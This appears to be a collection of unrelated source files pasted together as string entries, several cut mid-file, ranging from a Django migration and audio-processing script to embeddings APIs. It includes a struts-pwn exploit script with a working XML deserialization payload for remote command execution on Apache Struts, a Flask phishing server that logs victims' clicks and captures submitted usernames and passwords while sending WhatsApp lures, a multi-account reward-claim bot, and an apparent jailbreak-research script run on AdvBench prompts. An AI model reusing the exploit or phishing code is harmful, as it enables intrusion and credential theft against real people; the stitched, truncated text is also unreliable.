(Siripuram - VSP)\"),\n                            (\"I\", \"Seniors (NAD - NSTL Gate)\"),\n                            (\"J\", \"Juniors (NAD - NSTL)\"),\n                            (\"K\", \"Seniors (Town Kotha Road)\"),\n                            (\"L\", \"Seniors (NAD - NSTL)\"),\n                            (\"M\", \"Juniors/Seniors (Sabbavaram)\"),\n                            (\"N\", \"Seniors (NAD - Baji Jn..)\"),\n                            (\"O\", \"Juniors/Seniors (NAD - Baji Jn..)\"),\n                            (\"P\", \"Seniors (Dabagardens)\"),\n                            (\"Q\", \"Seniors (Denkada)\"),\n                            (\"R\", \"Juniors (Nellimarla)\"),\n                            (\"S\", \"Seniors (L Kota)\"),\n                            (\"T\", \"Juniors (Ayyannapeta)\"),\n                            (\"U\", \"Seniors (Cheepurupalli)\"),\n                            (\"V\", \"Seniors (Ayyannapeta)\"),\n                            (\"W\", \"Seniors (Poolbhag)\"),\n                        ],\n                        max_length=1,\n                        unique=True,\n                    ),\n                ),\n                (\"stop_name\", models.CharField(max_length=100)),\n                (\"fee\", models.DecimalField(decimal_places=2, max_digits=10)),\n                (\"start_time\", models.TimeField()),\n            ],\n        ),\n    ]\n",
    "#!/usr/bin/env python3\r\n# coding=utf-8\r\n\r\n# *****************************************************\r\n# struts-pwn: Apache Struts CVE-2017-9805 Exploit\r\n# Author:\r\n# Fariz Devloper <Fariz Devloper net>\r\n# This code is based on:\r\n# https://github.com/FarizDevloper\r\n# https://techblog.mediaservice.net/2017/09/detection-payload-for-the-new-struts-rest-vulnerability-cve-2017-9805/\r\n# *****************************************************\r\n\r\n# Move the future import to the top\r\nfrom __future__ import print_function\r\n\r\n# ASCII Banner (Use raw string for banner to avoid escape sequence issues)\r\nbanner = r\"\"\"\r\n______         _      ______           _                       \r\n|  ___|       (_)     |  _  \\         | |                      \r\n| |_ __ _ _ __ _ ____ | | | |_____   _| | ___  _ __   ___ _ __ \r\n|  _/ _` | '__| |_  / | | | / _ \\ \\ / / |/ _ \\| '_ \\ / _ \\ '__|\r\n| || (_| | |  | |/ /  | |/ /  __/\\ V /| | (_) | |_) |  __/ |   \r\n\\_| \\__,_|_|  |_/___| |___/ \\___| \\_/ |_|\\___/| .__/ \\___|_|   \r\n                                              | |              \r\n                                              |_|              \r\n\"\"\"\r\nprint(banner)\r\n\r\nimport argparse\r\nimport requests\r\nimport sys\r\n\r\n# Disable SSL warnings\r\ntry:\r\n    import requests.packages.urllib3\r\n    requests.packages.urllib3.disable_warnings()\r\nexcept Exception:\r\n    pass\r\n\r\nif len(sys.argv) <= 1:\r\n    print('[*] CVE: 2017-9805 - Apache Struts2 S2-052')\r\n    print('[*] Struts-PWN - @FarizDevloper')\r\n    print('\\n%s -h for help.' % (sys.argv[0]))\r\n    exit(0)\r\n\r\nparser = argparse.ArgumentParser()\r\nparser.add_argument(\"-u\", \"--url\",\r\n                    dest=\"url\",\r\n                    help=\"Check a single URL.\",\r\n                    action='store')\r\nparser.add_argument(\"-l\", \"--list\",\r\n                    dest=\"usedlist\",\r\n                    help=\"Check a list of URLs.\",\r\n                    action='store')\r\nparser.add_argument(\"-c\", \"--cmd\",\r\n                    dest=\"cmd\",\r\n                    help=\"Command to execute. (Default: 'echo test > /tmp/struts-pwn')\",\r\n                    action='store',\r\n                    default='echo test > /tmp/struts-pwn')\r\nparser.add_argument(\"--exploit\",\r\n                    dest=\"do_exploit\",\r\n                    help=\"Exploit.\",\r\n                    action='store_true')\r\nargs = parser.parse_args()\r\nurl = args.url if args.url else None\r\nusedlist = args.usedlist if args.usedlist else None\r\nurl = args.url if args.url else None\r\ncmd = args.cmd if args.cmd else None\r\ndo_exploit = args.do_exploit if args.do_exploit else None\r\n\r\n\r\ndef url_prepare(url):\r\n    url = url.replace('#', '%23')\r\n    url = url.replace(' ', '%20')\r\n    if ('://' not in url):\r\n        url = str('http') + str('://') + str(url)\r\n    return(url)\r\n\r\n\r\ndef exploit(url, cmd, dont_print_status_on_console=False):\r\n    url = url_prepare(url)\r\n    if dont_print_status_on_console is False:\r\n        print('\\n[*] URL: %s' % (url))\r\n        print('[*] CMD: %s' % (cmd))\r\n    cmd = \"\".join([\"<string>{0}</string>\".format(_) for _ in cmd.split(\" \")])\r\n    \r\n    payload = \"\"\"\r\n    <map>\r\n      <entry>\r\n        <jdk.nashorn.internal.objects.NativeString>\r\n          <flags>0</flags>\r\n          <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\r\n            <dataHandler>\r\n              <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\r\n                <is class=\"javax.crypto.CipherInputStream\">\r\n                  <cipher class=\"javax.crypto.NullCipher\">\r\n                    <initialized>false</initialized>\r\n                    <opmode>0</opmode>\r\n                    <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\r\n                      <iter class=\"javax.imageio.spi.FilterIterator\">\r\n                        <iter class=\"java.util.Collections$EmptyIterator\"/>\r\n                        <next class=\"java.lang.ProcessBuilder\">\r\n                          <command>\r\n                            {0}\r\n                          </command>\r\n                          <redirectErrorStream>false</redirectErrorStream>\r\n                        </next>\r\n                      </iter>\r\n                      <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\r\n                        <method>\r\n                          <class>java.lang.ProcessBuilder</class>\r\n                          <name>start</name>\r\n                          <parameter-types/>\r\n                        </method>\r\n                        <name>foo</name>\r\n                      </filter>\r\n                      <next class=\"string\">foo</next>\r\n                    </serviceIterator>\r\n                    <lock/>\r\n                  </cipher>\r\n                  <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\r\n                  <ibuffer/>\r\n                  <done>false</done>\r\n                  <ostart>0</ostart>\r\n                  <ofinish>0</ofinish>\r\n                  <closed>false</closed>\r\n                </is>\r\n                <consumed>false</con",
    "import csv\nimport os\nimport random\nimport time\nfrom flask import Flask, request, render_template, redirect\nfrom selenium import webdriver\nfrom selenium.webdriver.firefox.service import Service\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.common.exceptions import TimeoutException, NoSuchElementException\nfrom threading import Thread\n\napp = Flask(__name__)\n\nrid_info = {}\n\ndef load_rids_from_csv(csv_path=\"rids.csv\"):\n    if not os.path.exists(csv_path):\n        return\n    with open(csv_path, mode=\"r\", encoding=\"utf-8\") as f:\n        reader = csv.DictReader(f, fieldnames=[\"rid\", \"isim\", \"soyisim\", \"telefon\"])\n        for row in reader:\n            if row[\"rid\"] == \"rid\":\n                continue\n            r = row[\"rid\"]\n            name = row[\"isim\"]\n            surname = row[\"soyisim\"]\n            phone = row[\"telefon\"]\n            rid_info[r] = {\n                \"name\": name,\n                \"surname\": surname,\n                \"phone\": phone\n            }\n\ndef save_rid_to_csv(rid, name, surname, phone, csv_path=\"rids.csv\"):\n    file_exists = os.path.exists(csv_path)\n    with open(csv_path, mode=\"a\", newline=\"\", encoding=\"utf-8\") as f:\n        fieldnames = [\"rid\", \"isim\", \"soyisim\", \"telefon\"]\n        writer = csv.DictWriter(f, fieldnames=fieldnames)\n        if not file_exists:\n            writer.writeheader()\n        writer.writerow({\n            \"rid\": rid,\n            \"isim\": name,\n            \"soyisim\": surname,\n            \"telefon\": phone\n        })\n\ndef append_log_csv(row_data, file_path=\"sonuc.csv\"):\n    file_exists = os.path.exists(file_path)\n    with open(file_path, mode=\"a\", newline=\"\", encoding=\"utf-8\") as f:\n        writer = csv.writer(f)\n        if not file_exists:\n            writer.writerow([\"event_type\",\"rid\",\"name\",\"surname\",\"phone\",\"extra_info\",\"timestamp\"])\n        writer.writerow(row_data)\n\ndef send_message(driver, phone_number, message, rid, name, surname):\n\n    whatsapp_url = f\"https://web.whatsapp.com/send?phone={phone_number}&text={message}\"\n    driver.get(whatsapp_url)\n    time.sleep(15)  \n\n    try:\n        send_button = WebDriverWait(driver, 30).until(\n            EC.element_to_be_clickable((By.XPATH, \"//span[@data-icon='send']/parent::button\"))\n        )\n        ActionChains(driver).move_to_element(send_button).click().perform()\n\n       \n        append_log_csv([\n            \"mesaj_send\",\n            rid,\n            name,\n            surname,\n            phone_number,\n            \"server_script\",\n            time.ctime()\n        ])\n        print(f\"[OK] Mesaj g\u00f6nderildi -> {phone_number}\")\n\n    except TimeoutException:\n        print(f\"[ERR] Mesaj g\u00f6nderilemedi (Timeout): {phone_number}\")\n    except Exception as e:\n        try:\n            driver.execute_script(\"arguments[0].click();\", send_button)\n            append_log_csv([\n                \"mesaj_send\",\n                rid,\n                name,\n                surname,\n                phone_number,\n                \"server_script(JS)\",\n                time.ctime()\n            ])\n            print(f\"[OK JS] Mesaj g\u00f6nderildi -> {phone_number}\")\n        except Exception as js_error:\n            print(f\"[ERR JS] Mesaj g\u00f6nderilemedi: {phone_number} -> {str(js_error)}\")\n\n@app.route(\"/\")\ndef track_link():\n    rid = request.args.get(\"rid\")\n    if rid:\n        if rid in rid_info:\n            data = rid_info[rid]\n            name = data[\"name\"]\n            surname = data[\"surname\"]\n            phone = data[\"phone\"]\n        else:\n            name, surname, phone = \"unknown\", \"unknown\", \"unknown\"\n\n        user_agent = request.headers.get(\"User-Agent\", \"Unknown\")\n\n        append_log_csv([\n            \"clicked_link\",\n            rid,\n            name,\n            surname,\n            phone,\n            user_agent,\n            time.ctime()\n        ])\n\n        return redirect(f\"/login?rid={rid}\")\n    return \"RID bulunamad\u0131!\", 400\n\n@app.route(\"/login\", methods=[\"GET\",\"POST\"])\ndef login():\n    rid = request.args.get(\"rid\")\n    if request.method == \"POST\":\n        username = request.form.get(\"username\")\n        password = request.form.get(\"password\")\n\n        if username and password:\n            if rid and rid in rid_info:\n                data = rid_info[rid]\n                name = data[\"name\"]\n                surname = data[\"surname\"]\n                phone = data[\"phone\"]\n            else:\n                name, surname, phone = \"unknown\", \"unknown\", \"unknown\"\n\n            user_agent = request.headers.get(\"User-Agent\", \"Unknown\")\n\n            append_log_csv([\n                \"submited_data\",\n                rid,\n                name,\n                surname,\n                phone,\n                f\"user={username}, pass={password}, UA={user_agent}\",\n                time.ctime()\n            ])\n      ",
    "import matplotlib.pyplot as plt\nimport numpy as np\n\nimport librosa\nimport numpy as np\nimport soundfile as sf\n\n# Cargar el archivo de audio\ny, sr = librosa.load(\"/Users/belengotz/Desktop/The Beatles - Hey Jude - TheBeatlesVEVO (youtube).mp3\", sr=None)\n\n# Aplicar STFT para obtener una matriz de tiempo-frecuencia\nS = librosa.stft(y)\n\n# Separar en componentes arm\u00f3nico (voz) y percutivo (instrumentos)\nS_harmonic, S_percussive = librosa.decompose.hpss(S)\n\n# Tomar la magnitud del componente arm\u00f3nico para aplicar SVD\nS_magnitude = np.abs(S_harmonic)\n\n# Aplicar SVD a la matriz de magnitudes del componente arm\u00f3nico\nU, Sigma, Vt = np.linalg.svd(S_magnitude, full_matrices=False)\n\n# Seleccionar los primeros componentes para reconstruir la voz\nk = 5  # Ajusta el n\u00famero de componentes para aislar la voz\nS_vox_magnitude = U[:, :k] @ np.diag(Sigma[:k]) @ Vt[:k, :]\n\n# Reconstruir la se\u00f1al del componente de voz con la fase original\nS_vox = S_vox_magnitude * np.exp(1j * np.angle(S_harmonic))\n\n# Reconstruir las se\u00f1ales de audio de voz y percusi\u00f3n usando la inversa de STFT\ny_vox = librosa.istft(S_vox)\ny_instr = librosa.istft(S_percussive)\n\n# Aplicar un factor de ganancia (ajustable) para incrementar el volumen\ngain_factor = 5  # Ajusta este valor para cambiar el volumen\ny_vox = np.clip(y_vox * gain_factor, -1, 1)\ny_instr = np.clip(y_instr * gain_factor, -1, 1)\n\n# Guardar los audios resultantes con volumen ajustado\nsf.write(\"voz_separada_svd_con_volumen.wav\", y_vox, sr)\nsf.write(\"instrumentos_svd_separados_con_volumen.wav\", y_instr, sr)\n\n\n\n# Configuraci\u00f3n para subplots\nplt.figure(figsize=(15, 20))\n\n# 1. Espectrograma original\nplt.subplot(4, 1, 1)\nlibrosa.display.specshow(librosa.amplitude_to_db(np.abs(S), ref=np.max),\n                         sr=sr, x_axis='time', y_axis='log', cmap='magma')\nplt.title(\"Espectrograma original\")\nplt.colorbar(format=\"%+2.0f dB\")\n\n# 2. Espectrogramas de componentes\nplt.subplot(4, 1, 2)\nlibrosa.display.specshow(librosa.amplitude_to_db(np.abs(S_harmonic), ref=np.max),\n                         sr=sr, x_axis='time', y_axis='log', cmap='magma')\nplt.title(\"Componente arm\u00f3nico (voz)\")\nplt.colorbar(format=\"%+2.0f dB\")\n\nplt.subplot(4, 1, 3)\nlibrosa.display.specshow(librosa.amplitude_to_db(np.abs(S_percussive), ref=np.max),\n                         sr=sr, x_axis='time', y_axis='log', cmap='magma')\nplt.title(\"Componente percutivo (instrumentos)\")\nplt.colorbar(format=\"%+2.0f dB\")\n\n# 3. Valores singulares\nplt.subplot(4, 1, 4)\nplt.plot(Sigma, marker='o')\nplt.title(\"Valores singulares (\\u03A3)\")\nplt.xlabel(\"\u00cdndice del valor singular\")\nplt.ylabel(\"Magnitud\")\nplt.grid()\n\nplt.tight_layout()\nplt.show()\n\n# 4. Reconstrucci\u00f3n espectral\nplt.figure(figsize=(15, 10))\nplt.subplot(2, 1, 1)\nlibrosa.display.specshow(librosa.amplitude_to_db(S_vox_magnitude, ref=np.max),\n                         sr=sr, x_axis='time', y_axis='log', cmap='magma')\nplt.title(\"Espectrograma reconstruido (voz con SVD)\")\nplt.colorbar(format=\"%+2.0f dB\")\n\nplt.subplot(2, 1, 2)\nlibrosa.display.specshow(librosa.amplitude_to_db(np.abs(S_percussive), ref=np.max),\n                         sr=sr, x_axis='time', y_axis='log', cmap='magma')\nplt.title(\"Espectrograma reconstruido (instrumentos)\")\nplt.colorbar(format=\"%+2.0f dB\")\n\nplt.tight_layout()\nplt.show()\n\n\n#   source venv/bin/activate",
    "from loguru import logger\nfrom curl_cffi import requests\nimport time\n\nlogger.remove()\nlogger.add(\n    sink=lambda msg: print(msg, end=''),\n    format=(\n        \"<green>{time:DD/MM/YY HH:mm:ss}</green> | \"\n        \"<level>{level:8} | {message}</level>\"\n    ),\n    colorize=True\n)\n\n# Read Tokens and Proxy count\ndef read_tokens():\n    with open('token.txt', 'r') as file:\n        tokens_content = sum(1 for line in file)\n    return tokens_content\n\ntokens_content = read_tokens()\n\n# Print the token count\nprint()\nprint(f\"\ud83d\udd11 Account Found: {tokens_content}.\")\nprint()\n\ndef truncate_token(token):\n    return f\"{token[:4]}--{token[-4:]}\"\n\n# Function to claim reward using the provided token\ndef claim_reward(token):\n    url = \"https://api.nodepay.org/api/mission/complete-mission\"\n    headers = {\n        \"Authorization\": f\"Bearer {token}\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\",\n        \"Content-Type\": \"application/json\",\n        \"Origin\": \"https://app.nodepay.ai\",\n        \"Referer\": \"https://app.nodepay.ai/\"\n    }\n    data = {\"mission_id\": \"1\"}\n\n    while True:\n        try:\n            response = requests.post(url, headers=headers, json=data, impersonate=\"chrome110\")\n\n            if response.status_code == 200:\n                response_data = response.json()\n                if response_data.get('success'):\n                    logger.success(f\"Token: {truncate_token(token)} | Reward claimed successfully\")\n                else:\n                    logger.info(f\"Token: {truncate_token(token)} | Reward already claimed or another issue occurred\")\n                break  # Exit loop if successful\n            elif response.status_code == 403:\n                logger.warning(f\"Token: {truncate_token(token)} | Received HTTP 403. Retrying in 5 minutes...\")\n                time.sleep(300)  # Wait for 5 minutes before retrying\n            else:\n                logger.error(f\"Token: {truncate_token(token)} | Failed request, HTTP Status: {response.status_code}\")\n                break\n        except requests.exceptions.RequestException as e:\n            logger.exception(f\"Token: {truncate_token(token)} | Request error: {e}\")\n            break\n\ndef run_daily_claim():\n    try:\n        with open('token.txt', 'r') as file:\n            tokens = file.read().splitlines()\n\n        for token in tokens:\n            claim_reward(token)\n\n        # Send a final message after all operations are done\n        logger.success(f\"All tokens processed. Daily claim operation completed.\")\n\n    except FileNotFoundError:\n        logger.error(f\"The file 'token.txt' was not found. Please make sure it exists.\")\n    except Exception as e:\n        logger.exception(f\"An unexpected error occurred: {e}\")\n\nif __name__ == \"__main__\":\n    run_daily_claim()\n",
    "import functools\nimport logging\nimport re\nfrom typing import NewType, Optional, Tuple, cast\n\nfrom pip._vendor.packaging import specifiers, version\nfrom pip._vendor.packaging.requirements import Requirement\n\nNormalizedExtra = NewType(\"NormalizedExtra\", str)\n\nlogger = logging.getLogger(__name__)\n\n\ndef check_requires_python(\n    requires_python: Optional[str], version_info: Tuple[int, ...]\n) -> bool:\n    \"\"\"\n    Check if the given Python version matches a \"Requires-Python\" specifier.\n\n    :param version_info: A 3-tuple of ints representing a Python\n        major-minor-micro version to check (e.g. `sys.version_info[:3]`).\n\n    :return: `True` if the given Python version satisfies the requirement.\n        Otherwise, return `False`.\n\n    :raises InvalidSpecifier: If `requires_python` has an invalid format.\n    \"\"\"\n    if requires_python is None:\n        # The package provides no information\n        return True\n    requires_python_specifier = specifiers.SpecifierSet(requires_python)\n\n    python_version = version.parse(\".\".join(map(str, version_info)))\n    return python_version in requires_python_specifier\n\n\n@functools.lru_cache(maxsize=512)\ndef get_requirement(req_string: str) -> Requirement:\n    \"\"\"Construct a packaging.Requirement object with caching\"\"\"\n    # Parsing requirement strings is expensive, and is also expected to happen\n    # with a low diversity of different arguments (at least relative the number\n    # constructed). This method adds a cache to requirement object creation to\n    # minimize repeated parsing of the same string to construct equivalent\n    # Requirement objects.\n    return Requirement(req_string)\n\n\ndef safe_extra(extra: str) -> NormalizedExtra:\n    \"\"\"Convert an arbitrary string to a standard 'extra' name\n\n    Any runs of non-alphanumeric characters are replaced with a single '_',\n    and the result is always lowercased.\n\n    This function is duplicated from ``pkg_resources``. Note that this is not\n    the same to either ``canonicalize_name`` or ``_egg_link_name``.\n    \"\"\"\n    return cast(NormalizedExtra, re.sub(\"[^A-Za-z0-9.-]+\", \"_\", extra).lower())\n",
    "from PIL import Image\n\ndef extract_copyright_steganography(image_path, length=70):  # Default length is 50 chars\n    \"\"\"Extract hidden copyright text from image\"\"\"\n    # Open image\n    img = Image.open(image_path)\n    pixels = list(img.getdata())\n    \n    # Extract binary message\n    binary_message = ''\n    for i in range(length * 8):  # Each character needs 8 bits\n        if i >= len(pixels):\n            break\n        if isinstance(pixels[i], int):  # Grayscale\n            binary_message += str(pixels[i] & 1)\n        else:  # RGB or RGBA\n            binary_message += str(pixels[i][0] & 1)\n    \n    # Convert binary to text\n    message = ''\n    for i in range(0, len(binary_message), 8):\n        byte = binary_message[i:i+8]\n        try:\n            message += chr(int(byte, 2))\n        except ValueError:\n            break\n            \n    return message\n\n# Example usage\nimage_path = \"GgO-RwwXIAAsBbl.png\"  # Replace with your image name\nextracted_text = extract_copyright_steganography(image_path)\nprint(f\"Extracted text: {extracted_text}\")",
    "from __future__ import annotations\n\nimport logging\nimport os\nfrom datetime import datetime\nfrom typing import Dict, List, Union\n\nfrom fastapi import APIRouter, BackgroundTasks, HTTPException\nfrom pydantic import BaseModel, Field\n\nfrom .analytics import Analytics\nfrom .service import (\n    ModelConfig,\n    TextModelType,\n    EmbeddingsService,\n    ModelKind,\n    detect_model_kind,\n)\n\nlogger = logging.getLogger(__name__)\n\nrouter = APIRouter(\n    tags=[\"v1\"],\n    responses={404: {\"description\": \"Not found\"}},\n)\n\n\nclass EmbeddingRequest(BaseModel):\n    \"\"\"\n    Request model for generating embeddings.\n    \"\"\"\n\n    model: str = Field(\n        default=TextModelType.MULTILINGUAL_E5_SMALL.value,\n        description=(\n            \"Which model ID to use? \"\n            \"Text options: ['multilingual-e5-small', 'multilingual-e5-base', 'multilingual-e5-large', \"\n            \"'snowflake-arctic-embed-l-v2.0', 'paraphrase-multilingual-MiniLM-L12-v2', \"\n            \"'paraphrase-multilingual-mpnet-base-v2', 'bge-m3']. \"\n            \"Image option: ['siglip-base-patch16-256-multilingual'].\"\n        ),\n    )\n    input: Union[str, List[str]] = Field(\n        ..., description=\"Text(s) or image URL(s)/path(s).\"\n    )\n\n\nclass RankRequest(BaseModel):\n    \"\"\"\n    Request model for ranking candidates.\n    \"\"\"\n\n    model: str = Field(\n        default=TextModelType.MULTILINGUAL_E5_SMALL.value,\n        description=(\n            \"Model ID for the queries. \"\n            \"Can be a text or image model (e.g. 'siglip-base-patch16-256-multilingual' for images).\"\n        ),\n    )\n    queries: Union[str, List[str]] = Field(\n        ..., description=\"Query text(s) or image(s) depending on the model type.\"\n    )\n    candidates: List[str] = Field(..., description=\"Candidate texts to rank.\")\n\n\nclass EmbeddingResponse(BaseModel):\n    \"\"\"\n    Response model for embeddings.\n    \"\"\"\n\n    object: str\n    data: List[dict]\n    model: str\n    usage: dict\n\n\nclass RankResponse(BaseModel):\n    \"\"\"\n    Response model for ranking results.\n    \"\"\"\n\n    probabilities: List[List[float]]\n    cosine_similarities: List[List[float]]\n\n\nclass StatsBucket(BaseModel):\n    \"\"\"\n    Model for daily/weekly/monthly/yearly stats.\n    \"\"\"\n\n    total: Dict[str, int]\n    daily: Dict[str, int]\n    weekly: Dict[str, int]\n    monthly: Dict[str, int]\n    yearly: Dict[str, int]\n\n\nclass StatsResponse(BaseModel):\n    \"\"\"\n    Analytics stats response model, including both access and token counts.\n    \"\"\"\n\n    access: StatsBucket\n    tokens: StatsBucket\n\n\n# Initialize the embeddings service and analytics.\nservice_config = ModelConfig()\nembeddings_service = EmbeddingsService(config=service_config)\n\nanalytics = Analytics(\n    url=os.environ.get(\"REDIS_URL\", \"redis://localhost:6379/0\"),\n    token=os.environ.get(\"REDIS_TOKEN\", \"***\"),\n    sync_interval=30 * 60,  # 30 minutes\n)\n\n\n@router.post(\"/embeddings\", response_model=EmbeddingResponse, tags=[\"embeddings\"])\nasync def create_embeddings(\n    request: EmbeddingRequest, background_tasks: BackgroundTasks\n):\n    \"\"\"\n    Generate embeddings for the given text or image inputs.\n    \"\"\"\n    try:\n        modality = detect_model_kind(request.model)\n        embeddings = await embeddings_service.generate_embeddings(\n            model=request.model,\n            inputs=request.input,\n        )\n\n        # Estimate tokens if using a text model.\n        total_tokens = 0\n        if modality == ModelKind.TEXT:\n            total_tokens = embeddings_service.estimate_tokens(request.input)\n\n        resp = {\n            \"object\": \"list\",\n            \"data\": [],\n            \"model\": request.model,\n            \"usage\": {\n                \"prompt_tokens\": total_tokens,\n                \"total_tokens\": total_tokens,\n            },\n        }\n\n        for idx, emb in enumerate(embeddings):\n            resp[\"data\"].append(\n                {\n                    \"object\": \"embedding\",\n                    \"index\": idx,\n                    \"embedding\": emb.tolist(),\n                }\n            )\n\n        # Record analytics in the background.\n        background_tasks.add_task(\n            analytics.access, request.model, resp[\"usage\"][\"total_tokens\"]\n        )\n\n        return resp\n\n    except Exception as e:\n        msg = (\n            \"Failed to generate embeddings. Check model ID, inputs, etc.\\n\"\n            f\"Details: {str(e)}\"\n        )\n        logger.error(msg)\n        raise HTTPException(status_code=500, detail=msg)\n\n\n@router.post(\"/rank\", response_model=RankResponse, tags=[\"rank\"])\nasync def rank_candidates(request: RankRequest, background_tasks: BackgroundTasks):\n    \"\"\"\n    Rank candidate texts against the given queries.\n    \"\"\"\n    try:\n        results = await embeddings_service.rank(\n            model=request.model,\n            queries=request.queries,\n            candidates=request.candidates,\n        )\n\n        # Record analytics in the background.\n        background_tasks.add_task(\n            analytics.access, request.model, results[\"usage\"][\"total_tokens\"]\n        )",
    "import cv2, json\nimport numpy as np\nfrom PIL import Image, ImageDraw\n\n\n# TableVQA Image Tools\ndef focus_on_columns_with_mask(image, columns_to_focus_on, all_columns_bounding_boxes):\n    \"\"\"\n    This function is useful when you want to focus on some specific columns of the image.\n    It does this by masking out the columns that are not needed.\n    For example, you can focus on the columns in a table that are relevant to your analysis and ignore the rest.\n    Return the masked image.\n\n    Args:\n        image (PIL.Image.Image): the input image\n        columns_to_mask (List[str]): a list of column names to focus on.\n        all_columns_bounding_boxes (Dict[Dict]]): a dictionary of bounding boxes for all columns in the image. key is column name and value is the bounding box of that column. Each bounding box is in the format {'x1': x1, 'y1': y1, 'x2': x2, 'y2': y2}.\n\n    Returns:\n        image_with_focused_columns (PIL.Image.Image): the image with specified columns focused on\n        \n    Example:\n        image = Image.open(\"sample_img.jpg\")\n        image_with_focused_columns = focus_on_columns(image, [\"Year\", \"Name\"], {\"Year\": {'x1': 0.1, 'y1': 0.1, 'x2': 0.3, 'y2': 0.9}, \"Team\": {'x1': 0.4, 'y1': 0.1, 'x2': 0.6, 'y2': 0.9}, \"Name\": {'x1': 0.7, 'y1': 0.1, 'x2': 0.9, 'y2': 0.9}})\n        display(image_with_focused_columns)\n    \"\"\"\n    if len(all_columns_bounding_boxes) == 0 or len(columns_to_focus_on) == 0:\n        return image\n    # Create a drawing context for the image\n    draw = ImageDraw.Draw(image, \"RGBA\")\n\n    # Desipte the columns to focus on, mask out all other columns\n    columns_to_mask = [column for column in all_columns_bounding_boxes.keys() if column not in columns_to_focus_on]\n    print(columns_to_mask)\n    if len(columns_to_mask) == len(all_columns_bounding_boxes):\n        # This means to mask all columns, must be mistake, so return the original image\n        return image\n\n    # Iterate over the columns to mask out\n    for column_name in columns_to_mask:\n        # Get the bounding box of the column\n        column_bbox = all_columns_bounding_boxes[column_name]\n        \n        # Convert the bounding box to pixel coordinates\n        # Define the region to mask out in the image as a tuple (x1, y1, x2, y2)\n        x1 = int(column_bbox['x1'] * image.width + 2)\n        y1 = int(column_bbox['y1'] * image.height + 2)\n        x2 = int(column_bbox['x2'] * image.width - 2)\n        y2 = int(column_bbox['y2'] * image.height - 2)\n        draw.rectangle(((x1, y1), (x2, y2)), fill=\"white\")\n\n    image_with_focused_columns = image\n    return image_with_focused_columns\n\ndef focus_on_rows_with_mask(image, rows_to_focus_on, all_rows_bounding_boxes):\n    \"\"\"\n    This function is useful when you want to focus on some specific rows of the image.\n    It does this by masking out the rows that are not needed.\n    For example, you can focus on the rows in a table that are relevant to your analysis and ignore the rest.\n    Return the masked image.\n    \n    Args:\n        image (PIL.Image.Image): the input image\n        rows_to_focus_on (List[str]): a list of row headers to focus on.\n        all_rows_bounding_boxes (Dict[Dict]): a dictionary of bounding boxes for all rows in the image. key is row header and value is the bounding box of that row. Each bounding box is in the format {'x1': x1, 'y1': y1, 'x2': x2, 'y2': y2}.\n    \n    Returns:\n        image_with_focused_rows (PIL.Image.Image): the image with specified rows focused on\n\n    Example:\n        image = Image.open(\"sample_img.jpg\")\n        image_with_focused_rows = focus_on_rows(image, [\"1972\"], [\"Year\": {'x1': 0.1, 'y1': 0.1, 'x2': 0.9, 'y2': 0.15}, \"1969\": {'x1': 0.1, 'y1': 0.2, 'x2': 0.9, 'y2': 0.5}, \"1972\": {'x1': 0.1, 'y1': 0.6, 'x2': 0.9, 'y2': 0.9}])\n        display(image_with_focused_rows)\n    \"\"\"\n    if len(rows_to_focus_on) == 0 or len(all_rows_bounding_boxes) == 0:\n        return image\n\n    # Create a drawing context for the image\n    draw = ImageDraw.Draw(image, \"RGBA\")\n\n    # Desipte the rows to focus on and the first row, mask out all other rows\n    rows_to_mask = [row for row in list(all_rows_bounding_boxes.keys())[1:] if row not in rows_to_focus_on]\n    print(rows_to_mask)\n    if len(rows_to_mask) == len(all_rows_bounding_boxes) - 1:\n        # This means to mask all rows, must be mistake, so return the original image\n        return image\n\n    # Iterate over the rows to mask out\n    for row_starter in rows_to_mask:\n        if row_starter == list(all_rows_bounding_boxes.keys())[0]:\n            # do not mask out the first row\n            continue\n        # Get the bounding box of the row\n        row_bbox = all_rows_bounding_boxes[row_starter]\n        \n        # Convert the bounding box to pixel coordinates\n        # Define the region to mask out in the image as a tuple (x1, y1, x2, y2)\n        x1 = int(row_bbox['x1'] * image.width + 2)\n        y1 = int(row_bbox['y1'] * image.height + 2)\n        x2 = int(row_bbox['x2'] * image.width - 2)\n        y2 = int(row_bb",
    "import pandas as pd\nimport torch\nimport os\nimport argparse\nimport re\nimport ast\n\nfrom poate_attack.attacks.jailbreak.base import TargetLM\n\n\nINTENT_PROMPT = \"\"\"\nPlease extract the malicious content in the given sentence and output in the following JSON format.\n{{\n  \\\"malicious_content\\\": \\\"...\\\"\n}}\nsentence: \u201c{sentence}\u201c\n\"\"\".strip()\n\nMAL_CONTENT_PROMPT = \"\"\"\n{{\n    \\\"malicious_content\\\": \\\"{mal_content}\\\"\n}}\n\"\"\".strip()\n\n\ndef create_intent_prompt(sentence: str):\n    return INTENT_PROMPT.format(sentence=sentence)\n\ndef create_mal_content_prompt(mal_content: str):\n    return MAL_CONTENT_PROMPT.format(mal_content=mal_content)\n\nif __name__ == '__main__':\n\n    dataset = \"advbench\"\n    data_path = f'./data/test_datasets/{dataset}_sampled_data.csv'\n\n    targetLM = TargetLM(\n        model_name=\"Llama_3.1_8b_instruct\",\n        max_n_tokens=1024,\n        temperature=0.0,\n        top_p=1,\n        top_k=-1,\n        seed=42\n    )\n\n    df = pd.read_csv(data_path)\n\n    for i, row in df.iterrows():\n        input_prompt = row['prompt']\n\n        # select 8 other examples other than the current one to make the prompt\n        other_rows = df[df['prompt'] != input_prompt]\n        other_rows = other_rows.sample(8)\n        sampled_prompts = other_rows['prompt'].to_list()\n        sampled_mal_contents = other_rows['malicious_content'].to_list()\n\n        intent_prompts = [create_intent_prompt(p) for p in sampled_prompts]\n        mal_contents_prompts = [create_mal_content_prompt(m) for m in sampled_mal_contents]\n\n        examples = list(zip(intent_prompts, mal_contents_prompts))\n\n        target_responses = targetLM.get_response(\n            examples=examples,\n            prompts=[create_intent_prompt(input_prompt)],\n            targets=[],\n            defense_type='none',\n        